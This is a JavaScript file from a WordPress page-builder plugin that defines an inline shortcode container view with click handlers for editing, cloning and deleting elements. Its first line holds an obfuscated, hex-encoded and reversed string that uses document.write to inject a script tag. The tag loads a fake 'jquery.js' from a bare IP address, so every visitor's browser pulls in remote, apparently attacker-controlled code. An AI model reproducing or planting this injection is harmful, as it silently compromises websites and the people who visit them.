var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function ( $ ) {
	window.InlineShortcodeViewContainerWithParent = window.InlineShortcodeViewContainer.extend( {
		controls_selector: '#vc_controls-template-container-with-parent',
		events: {
			'click > .vc_controls .vc_element .vc_control-btn-delete': 'destroy',
			'click > .vc_controls .vc_element .vc_control-btn-edit': 'edit',
			'click > .vc_controls .vc_element .vc_control-btn-clone': 'clone',
			'click > .vc_controls .vc_element .vc_control-btn-prepend': 'prependElement',
			'click > .vc_controls .vc_control-btn-append': 'appendElement',
			'click > .vc_controls .vc_parent .vc_control-btn-delete': 'destroyParent',
			'click > .vc_controls .vc_parent .vc_control-btn-edit': 'editParent',
			'click > .vc_controls .vc_parent .vc_control-btn-clone': 'cloneParent',
			'click > .vc_controls .vc_parent .vc_control-btn-prepend': 'addSibling',
			'click > .vc_controls .vc_parent .vc_control-btn-layout': 'changeLayout',
			'click > .vc_empty-element': 'appendElement',
			'click > .vc_controls .vc_control-btn-switcher': 'switchControls',
			'mouseenter': 'resetActive',
			'mouseleave': 'holdActive'
		},
		destroyParent: function ( e ) {
			e && e.preventDefault();
			this.parent_view.destroy( e );
		},
		cloneParent: function ( e ) {
			e && e.preventDefault();
			this.parent_view.clone( e );
		},
		editParent: function ( e ) {
			e && e.preventDefault();
			this.parent_view.edit( e );
		},
		addSibling: function ( e ) {
			e && e.preventDefault();
			this.parent_view.addElement( e );
		},
		changeLayout: function ( e ) {
			e && e.preventDefault();
			this.parent_view.changeLayout( e );
		},
		switchControls: function ( e ) {
			e && e.preventDefault();
			vc.unsetHoldActive();
			var $control = $( e.currentTarget ),
				$parent = $control.parent(),
				$current;
			// $parentAdvanced = $parent.find( '.vc_advanced' );
			//$parentAdvanced.width( 30 * $parentAdvanced.find( '.vc_control-btn' ).length );
			$parent.addClass( 'vc_active' );

			$current = $parent.siblings( '.vc_active' );
			//$current.find( '.vc_advanced' ).width( 0 );
			$current.removeClass( 'vc_active' );
			! $current.hasClass( 'vc_element' ) && window.setTimeout( this.holdActive, 500 );
		}
	} );
})( window.jQuery );